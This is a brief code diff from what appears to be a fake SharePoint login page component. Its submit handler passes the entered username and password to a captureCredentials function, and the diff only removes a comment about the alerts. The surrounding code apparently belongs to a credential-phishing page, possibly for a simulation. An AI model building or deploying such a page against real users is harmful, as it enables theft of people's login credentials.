@@ -38,7 +38,6 @@ export default function SharePointLoginPage() {
       await captureCredentials({ username, password });
       setShowSuccessAlert(true);
     } catch (error) {
-      // The client-side logic is designed to show the alert regardless of success or failure.
       console.error('Error in handleSubmit:', error);
       setShowErrorAlert(true);
     } finally {
